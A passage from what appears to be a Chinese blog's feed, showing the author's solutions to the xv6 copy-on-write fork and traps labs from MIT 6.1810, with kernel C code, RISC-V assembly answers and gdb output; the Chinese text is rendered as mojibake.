&#123;remaining&#125;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> remaining == <span class="number">9</span> &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> count == <span class="number">2</span> &#123;</span><br><span class="line">            <span class="keyword">break</span> <span class="symbol">&#x27;counting_up</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        remaining -= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    count += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;End count = &#123;count&#125;&quot;</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;ä»…ä»…ä»‹ç» Rust çš„å®‰è£…ã€Cargoã€å˜é‡ã€æ•°æ®ç±»å‹ã€å‡½æ•°å’Œæ§åˆ¶æµ&lt;/p&gt;</summary>
    
    
    
    <category term="Tools" scheme="https://humoooor.cn/categories/Tools/"/>
    
    
    <category term="Rust" scheme="https://humoooor.cn/tags/Rust/"/>
    
  </entry>
  
  <entry>
    <title>Lab5 Copy-on-write fork</title>
    <link href="https://humoooor.cn/2022/11/12/Lab5_Copy_on_write_fork/"/>
    <id>https://humoooor.cn/2022/11/12/Lab5_Copy_on_write_fork/</id>
    <published>2022-11-12T01:25:00.000Z</published>
    <updated>2023-05-23T03:22:49.245Z</updated>
    
    <content type="html"><![CDATA[<p>é¡µè¡¨ç‰›é€¼</p><span id="more"></span><h2 id="å®ç°-Copy-on-write-fork"><a href="#å®ç°-Copy-on-write-fork" class="headerlink" title="å®ç° Copy-on-write fork"></a>å®ç° Copy-on-write fork</h2><ol><li>æ·»åŠ å®å®šä¹‰ PTE_COWï¼Œä½¿ç”¨ PTE çš„ RSW æœ€ä½æœ‰æ•ˆä½ï¼Œæ¥æ ‡è¯†æ˜¯å¦æ˜¯ COW é¡µï¼Œåªç”¨äºå¯å†™é¡µ</li></ol><figure class="highlight c"><figcaption><span>kernel/riscv.h</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_COW (1L &lt;&lt; 8)</span></span><br></pre></td></tr></table></figure><ol start="2"><li>æ·»åŠ  reference count æ ‡è¯†ä¸€ä¸ªç‰©ç†é¡µé¢è¢«å‡ ä¸ªç”¨æˆ·é¡µè¡¨æŒ‡å‘ï¼Œåˆå§‹åŒ–ï¼Œå¢å‡</li></ol><p>æç¤ºä½¿ç”¨ kenel/kalloc.c é‡Œ <code>kinit()</code> é‡Œ <code>freerange()</code> çš„èŒƒå›´ï¼Œé€šè¿‡è°ƒè¯• end = 0x80041c50ï¼ŒPHYSTOP = 0x88000000ï¼Œç›¸å‡é™¤ä»¥ 4096 å¾— 0x7fbe</p><p>ä½†æ˜¯åœ¨ make qemu æ—¶ï¼Œè¿‡ <code>usertests -q</code> æ—¶ï¼Œæœ€åä¼šæ˜¾ç¤ºä¸¢å¤±ä¸€äº›é¡µï¼Œä½†æ˜¯ make CPUS=1 qemu-gdb æ—¶åˆæ˜¾ç¤ºé€šè¿‡ï¼Œå¯èƒ½å­å•Šå¤šæ ¸æ—¶ä¼šå‡ºç°ä¸€äº›é—®é¢˜ï¼Œå¾ˆæ€ª</p><p>å°† 0x7fbe æ”¹ä¸º 0x7fc0 å°±æ²¡æœ‰é—®é¢˜ï¼Œä¸æ˜¯å¾ˆæ‡‚ï¼Œå¦‚æœæœ‰äº†è§£çš„å¸ˆå‚…å¯ä»¥å‘Šè¯‰æˆ‘ğŸ</p><p>ç¬”è€…æŠŠå®ƒæ”¾åˆ° kmem é‡Œï¼Œå¢å‡æ—¶ç”¨ kmem.lock é”</p><figure class="highlight c"><figcaption><span>kernel/kalloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">freelist</span>;</span></span><br><span class="line">  uint refers[<span class="number">0x7fc0</span>];</span><br><span class="line">&#125; kmem;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">kinit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  initlock(&amp;kmem.lock, <span class="string">&quot;kmem&quot;</span>);</span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(kmem.refers) / <span class="keyword">sizeof</span>(kmem.refers[<span class="number">0</span>]); ++i) &#123;</span><br><span class="line">    kmem.refers[i]++;</span><br><span class="line">  &#125;</span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line">  freerange(end, (<span class="type">void</span>*)PHYSTOP);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">kfree</span><span class="params">(<span class="type">void</span> *pa)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(((uint64)pa % PGSIZE) != <span class="number">0</span> || (<span class="type">char</span>*)pa &lt; end || (uint64)pa &gt;= PHYSTOP)</span><br><span class="line">    panic(<span class="string">&quot;kfree&quot;</span>);</span><br><span class="line"></span><br><span class="line">  krefDecre(pa);</span><br><span class="line">  <span class="keyword">if</span>(!kref(pa)) &#123;</span><br><span class="line">    <span class="comment">// Fill with junk to catch dangling refs.</span></span><br><span class="line">    <span class="built_in">memset</span>(pa, <span class="number">1</span>, PGSIZE);</span><br><span class="line"></span><br><span class="line">    r = (<span class="keyword">struct</span> run*)pa;</span><br><span class="line">    acquire(&amp;kmem.lock);</span><br><span class="line">    r-&gt;next = kmem.freelist;</span><br><span class="line">    kmem.freelist = r;</span><br><span class="line">    release(&amp;kmem.lock);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *</span><br><span class="line"><span class="title function_">kalloc</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  r = kmem.freelist;</span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    kmem.freelist = r-&gt;next;</span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(r) &#123;</span><br><span class="line">    krefIncre((<span class="type">void</span>*)r);</span><br><span class="line">    <span class="built_in">memset</span>((<span class="type">char</span>*)r, <span class="number">5</span>, PGSIZE); <span class="comment">// fill with junk</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span>*)r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint</span><br><span class="line"><span class="title function_">kref</span><span class="params">(<span class="type">void</span> *pa)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> kmem.refers[(pa - (<span class="type">void</span>*)end)/<span class="number">4096</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">krefIncre</span><span class="params">(<span class="type">void</span> *pa)</span></span><br><span class="line">&#123;</span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  kmem.refers[(pa - (<span class="type">void</span>*)end)/<span class="number">4096</span>]++;</span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">krefDecre</span><span class="params">(<span class="type">void</span> *pa)</span> &#123;</span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  kmem.refers[(pa - (<span class="type">void</span>*)end)/<span class="number">4096</span>]--;</span><br><span class="line">  release(&amp;kmem.lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>ä¿®æ”¹ <code>uvmcopy</code>ï¼Œåœ¨å¤åˆ¶æ—¶å°†å­è¿›ç¨‹é¡µè¡¨ç›´æ¥æŒ‡å‘çˆ¶è¿›ç¨‹é¡µè¡¨å¯¹åº”çš„ç‰©ç†åœ°å€</li></ol><p>å› ä¸ºåœ¨è°ƒç”¨ <code>fork</code> æ—¶ï¼Œå¤åˆ¶å†…å­˜å°±æ˜¯ç›´æ¥è°ƒç”¨ <code>uvmcopy</code>ï¼Œä¿®æ”¹è¿™ä¸ªå°±è¡Œ</p><p>å½“é‡åˆ°å¯å†™çš„é¡µæ—¶ï¼Œå–æ¶ˆ PTE_Wï¼Œæ·»åŠ  PTE_COW</p><figure class="highlight c"><figcaption><span>kernel/vm.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">uvmcopy</span><span class="params">(<span class="type">pagetable_t</span> old, <span class="type">pagetable_t</span> new, uint64 sz)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">pte_t</span> *pte;</span><br><span class="line">  uint64 pa, i;</span><br><span class="line">  uint flags;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; sz; i += PGSIZE)&#123;</span><br><span class="line">    <span class="keyword">if</span>((pte = walk(old, i, <span class="number">0</span>)) == <span class="number">0</span>)</span><br><span class="line">      panic(<span class="string">&quot;uvmcopy: pte should exist&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>)</span><br><span class="line">      panic(<span class="string">&quot;uvmcopy: page not present&quot;</span>);</span><br><span class="line">    pa = PTE2PA(*pte);</span><br><span class="line">    flags = PTE_FLAGS(*pte);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(flags &amp; PTE_W) &#123;</span><br><span class="line">      flags = (flags &amp; ~PTE_W) | PTE_COW;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(mappages(new, i, PGSIZE, pa, flags) != <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="keyword">goto</span> err;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(flags &amp; PTE_COW) &#123;</span><br><span class="line">      *pte = PA2PTE(pa) | flags;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    krefIncre((<span class="type">void</span>*)pa);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> err:</span><br><span class="line">  uvmunmap(new, <span class="number">0</span>, i / PGSIZE, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><del>æ€ä¹ˆæœ‰äººæ€»æ˜¯æŠŠ &amp; å’Œ | çš„åŠŸèƒ½å†™å</del></p><ol start="4"><li>ä¿®æ”¹ kernel/trap.c çš„ <code>usertrap</code> å’Œ kernel/vm.c çš„ <code>copyout</code>ï¼Œæ·»åŠ é‡åˆ° COW é¡µçš„æƒ…å†µ</li></ol><p>æ³¨æ„è™šæ‹Ÿåœ°å€è¦å°äº MAXVAï¼Œå¦åˆ™åœ¨ <code>walk</code> æ—¶ä¼šç›´æ¥å‡ºç° panic</p><figure class="highlight c"><figcaption><span>kernel/vm.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">copyout</span><span class="params">(<span class="type">pagetable_t</span> pagetable, uint64 dstva, <span class="type">char</span> *src, uint64 len)</span></span><br><span class="line">&#123;</span><br><span class="line">  uint64 n, va0, pa0;</span><br><span class="line">  <span class="type">pte_t</span> *pte = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(len &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    va0 = PGROUNDDOWN(dstva);</span><br><span class="line">    <span class="keyword">if</span>(dstva &lt; MAXVA) &#123;</span><br><span class="line">      pte = walk(pagetable, dstva, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(pte &amp;&amp; (*pte &amp; PTE_COW)) &#123;</span><br><span class="line">      <span class="keyword">if</span>(copyCOW(pte)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    pa0 = walkaddr(pagetable, va0);</span><br><span class="line">    <span class="keyword">if</span>(pa0 == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    n = PGSIZE - (dstva - va0);</span><br><span class="line">    <span class="keyword">if</span>(n &gt; len)</span><br><span class="line">      n = len;</span><br><span class="line">    memmove((<span class="type">void</span> *)(pa0 + (dstva - va0)), src, n);</span><br><span class="line"></span><br><span class="line">    len -= n;</span><br><span class="line">    src += n;</span><br><span class="line">    dstva = va0 + PGSIZE;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">copyCOW</span><span class="params">(<span class="type">pte_t</span> *pte)</span> &#123;</span><br><span class="line">  uint64 pa = PTE2PA(*pte);</span><br><span class="line">  uint flags = (PTE_FLAGS(*pte) &amp; ~PTE_COW) | PTE_W;</span><br><span class="line">  *pte = PA2PTE(pa) | flags;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(kref((<span class="type">void</span>*)pa) != <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="type">char</span> *mem = kalloc();</span><br><span class="line">    <span class="keyword">if</span>(mem == <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      memmove(mem, (<span class="type">char</span>*)pa, PGSIZE);</span><br><span class="line">      *pte = PA2PTE(mem) | flags;</span><br><span class="line">      krefDecre((<span class="type">void</span>*)pa);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><figcaption><span>kernel/trap.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(r_scause() == <span class="number">15</span> &amp;&amp; r_stval() &lt; MAXVA &amp;&amp; (*(pte = walk(p-&gt;pagetable, r_stval(), <span class="number">0</span>)) &amp; PTE_COW)) &#123;</span><br><span class="line">  <span class="comment">// store COW page fault</span></span><br><span class="line">  <span class="keyword">if</span>(copyCOW(pte)) &#123;</span><br><span class="line">    setkilled(p);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>æœ€ååœ¨ kernel/defs.h é‡Œæ·»åŠ ä¸€äº›å‡½æ•°å£°æ˜å³å¯</p><h2 id="Optional-challenge-exercise"><a href="#Optional-challenge-exercise" class="headerlink" title="Optional challenge exercise"></a>Optional challenge exercise</h2><h3 id="æµ‹é‡ä½ çš„-COW-å®ç°å‡å°‘äº†å¤šå°‘å­—èŠ‚çš„å¤åˆ¶å’Œå¤šå°‘é¡µç‰©ç†å†…å­˜çš„åˆ†é…"><a href="#æµ‹é‡ä½ çš„-COW-å®ç°å‡å°‘äº†å¤šå°‘å­—èŠ‚çš„å¤åˆ¶å’Œå¤šå°‘é¡µç‰©ç†å†…å­˜çš„åˆ†é…" class="headerlink" title="æµ‹é‡ä½ çš„ COW å®ç°å‡å°‘äº†å¤šå°‘å­—èŠ‚çš„å¤åˆ¶å’Œå¤šå°‘é¡µç‰©ç†å†…å­˜çš„åˆ†é…"></a>æµ‹é‡ä½ çš„ COW å®ç°å‡å°‘äº†å¤šå°‘å­—èŠ‚çš„å¤åˆ¶å’Œå¤šå°‘é¡µç‰©ç†å†…å­˜çš„åˆ†é…</h3><p>#todo</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;é¡µè¡¨ç‰›é€¼&lt;/p&gt;</summary>
    
    
    
    <category term="Course" scheme="https://humoooor.cn/categories/Course/"/>
    
    <category term="MIT 6.1810 2022Fall" scheme="https://humoooor.cn/categories/Course/MIT-6-1810-2022Fall/"/>
    
    
    <category term="Operating System" scheme="https://humoooor.cn/tags/Operating-System/"/>
    
    <category term="RISC-V" scheme="https://humoooor.cn/tags/RISC-V/"/>
    
    <category term="Xv6" scheme="https://humoooor.cn/tags/Xv6/"/>
    
  </entry>
  
  <entry>
    <title>Lab4 Traps</title>
    <link href="https://humoooor.cn/2022/10/31/Lab4_Traps/"/>
    <id>https://humoooor.cn/2022/10/31/Lab4_Traps/</id>
    <published>2022-10-31T03:47:00.000Z</published>
    <updated>2023-05-29T08:09:58.811Z</updated>
    
    <content type="html"><![CDATA[<p>å¼€å­¦ï¼</p><span id="more"></span><h2 id="RISC-V-assembly"><a href="#RISC-V-assembly" class="headerlink" title="RISC-V assembly"></a>RISC-V assembly</h2><figure class="highlight c"><figcaption><span>user/call.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">g</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">Â  <span class="keyword">return</span> x+<span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">Â  <span class="keyword">return</span> g(x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">Â  <span class="built_in">printf</span>(<span class="string">&quot;%d %d\n&quot;</span>, f(<span class="number">8</span>)+<span class="number">1</span>, <span class="number">13</span>);</span><br><span class="line">Â  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é˜…è¯» user/call.asm å›ç­”é—®é¢˜~</p><figure class="highlight x86asm"><figcaption><span>main.asm</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">000000000000001c &lt;main&gt;:</span><br><span class="line"></span><br><span class="line">void main(void) &#123;</span><br><span class="line">Â  1c: <span class="number">1141</span> Â  Â  Â  Â  Â  Â  Â  Â  addi Â <span class="built_in">sp</span>,<span class="built_in">sp</span>,-<span class="number">16</span></span><br><span class="line">Â  1e: e406 Â  Â  Â  Â  Â  Â  Â  Â  sd ra,<span class="number">8</span>(<span class="built_in">sp</span>)</span><br><span class="line">Â  <span class="number">20</span>: e022 Â  Â  Â  Â  Â  Â  Â  Â  sd s0,<span class="number">0</span>(<span class="built_in">sp</span>)</span><br><span class="line">Â  <span class="number">22</span>: <span class="number">0800</span> Â  Â  Â  Â  Â  Â  Â  Â  addi Â s0,<span class="built_in">sp</span>,<span class="number">16</span></span><br><span class="line">Â  printf(<span class="string">&quot;%d %d\n&quot;</span>, f(<span class="number">8</span>)+<span class="number">1</span>, <span class="number">13</span>)<span class="comment">;</span></span><br><span class="line">Â  <span class="number">24</span>: <span class="number">4635</span> Â  Â  Â  Â  Â  Â  Â  Â  li a2,<span class="number">13</span></span><br><span class="line">Â  <span class="number">26</span>: 45b1 Â  Â  Â  Â  Â  Â  Â  Â  li a1,<span class="number">12</span></span><br><span class="line">Â  <span class="number">28</span>: <span class="number">00000517</span> Â  Â  Â  Â  Â  Â  auipc a0,<span class="number">0x0</span></span><br><span class="line">Â  2c: 7c850513 Â  Â  Â  Â  Â  Â  addi Â a0,a0,<span class="number">1992</span> # 7f0 &lt;malloc+<span class="number">0xee</span>&gt;</span><br><span class="line">Â  <span class="number">30</span>: <span class="number">00000097</span> Â  Â  Â  Â  Â  Â  auipc ra,<span class="number">0x0</span></span><br><span class="line">Â  <span class="number">34</span>: 614080e7 Â  Â  Â  Â  Â  Â  jalr Â <span class="number">1556</span>(ra) # <span class="number">644</span> &lt;printf&gt;</span><br><span class="line">Â  exit(<span class="number">0</span>)<span class="comment">;</span></span><br><span class="line">Â  <span class="number">38</span>: <span class="number">4501</span> Â  Â  Â  Â  Â  Â  Â  Â  li a0,<span class="number">0</span></span><br><span class="line">Â  3a: <span class="number">00000097</span> Â  Â  Â  Â  Â  Â  auipc ra,<span class="number">0x0</span></span><br><span class="line">Â  3e: 290080e7 Â  Â  Â  Â  Â  Â  jalr Â <span class="number">656</span>(ra) # 2ca &lt;exit&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ä¼ ç»™å‡½æ•°çš„å‚æ•°ä¿å­˜åœ¨å“ªäº›å¯„å­˜å™¨ä¸­ï¼Ÿä¾‹å¦‚ main å‡½æ•°ä¸­çš„è°ƒç”¨ printf çš„å‚æ•° 13 ä¿å­˜åœ¨å“ªä¸ªå¯„å­˜å™¨ä¸­ï¼Ÿ</p></blockquote><p>a0 ~ a7 ä¿å­˜å‡½æ•°å‚æ•°ï¼Œæ›´å¤šçš„å‚æ•°æ”¾åœ¨æ ˆä¸­</p><p>main è°ƒç”¨ printf çš„å‚æ•° 13 åœ¨ a2 ä¸­</p><blockquote><p>main å‡½æ•°ä¸­è°ƒç”¨ f å‡½æ•°çš„æ±‡ç¼–ä»£ç åœ¨å“ªï¼Ÿè°ƒç”¨ g å‡½æ•°çš„ä»£ç åœ¨å“ªï¼Ÿï¼ˆæç¤ºï¼šç¼–è¯‘å™¨å¯èƒ½å†…è”å‡½æ•°ï¼‰</p></blockquote><p>çœŸçš„æœ‰è°ƒç”¨å—ã€‚ã€‚ã€‚æ„Ÿè§‰ç¼–è¯‘å™¨ä¼˜åŒ–äº†ï¼Œç›´æ¥æŠŠ f(8)+1 çš„ç»“æœè®¡ç®—å‡ºæ¥ä¸º 12ï¼Œä¼ ç»™ a1 å¯„å­˜å™¨äº†ã€‚</p><blockquote><p>printf å‡½æ•°çš„åœ°å€æ˜¯å¤šå°‘ï¼Ÿ</p></blockquote><p>çœ‹æ³¨é‡Šï¼Œåœ¨ 0x644</p><blockquote><p>åœ¨ main å‡½æ•°ä¸­ï¼Œåœ¨æ‰§è¡Œ jalr è·³è½¬åˆ° printf åï¼Œra å¯„å­˜å™¨çš„å€¼æ—¶å¤šå°‘ï¼Ÿ</p></blockquote><p>0x38</p><p>jalr ä¼šå°†ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€å­˜åˆ°æ‹¬å·ä¸­çš„å¯„å­˜å™¨ä¸­</p><blockquote><p>è¿è¡Œä¸‹é¢çš„ä»£ç ï¼Œè¾“å‡ºä»€ä¹ˆï¼Ÿ<br>unsigned int i = 0x00646c72;<br>printf(â€œH%xâ€ Wo%sâ€, 57616, &amp;i);</p></blockquote><p>He110 World</p><blockquote><p>ä¸‹é¢çš„ä»£ç ï¼Œä¼šæ‰“å°å‡º â€˜y=â€™ ä»€ä¹ˆï¼Ÿ<br>printf(â€œx=%d y=%dâ€, 3);</p></blockquote><p>æŒ‰ç…§ RISC-V çš„å‡½æ•°è°ƒç”¨çº¦å®šï¼Œä¼šæ‰“å°å‡º a2 å¯„å­˜å™¨çš„å€¼</p><h2 id="Backtrace"><a href="#Backtrace" class="headerlink" title="Backtrace"></a>Backtrace</h2><p>å¯¹å†…æ ¸çš„å‡½æ•°è°ƒç”¨è¿›è¡Œå›æº¯ï¼Œæ¯”è¾ƒç®€å•</p><p>æ ¹æ® RISC-V çš„å‡½æ•°è°ƒç”¨çº¦å®šï¼Œra ä½äº fp - 0x8 çš„ä½ç½®ï¼ŒPrev.fp ä½äº fp - 0x10 çš„ä½ç½®</p><p>åœ¨å†…æ ¸æ ˆä¸­ï¼Œæœ€åä¸€ä¸ªæ ˆå¸§æŒ‡é’ˆä½äºé¡µé¢çš„é¦–åœ°å€ï¼Œæ ¹æ®è¿™ä¸ªå¯ä»¥åˆ¤æ–­ä½•æ—¶é€€å‡ºå¾ªç¯</p><p>å¯ä»¥é€šè¿‡ gdb è¿›è¡Œè°ƒè¯•ï¼Œ0x3ffffff9fc0 -&gt; 0x3ffffffe0 -&gt; 0x3ffffffa000</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/20gx <span class="variable">$fp</span>-0x10</span><br><span class="line">0x3fffff9f70:   0x0000003fffff9fc0      0x00000000800021aa</span><br><span class="line">0x3fffff9f80:   0x0000003fffff9fc0      0x00000001ffff9fa0</span><br><span class="line">0x3fffff9f90:   0x0000003fffff9fc0      0x0000000000000020</span><br><span class="line">0x3fffff9fa0:   0x0000000087f70000      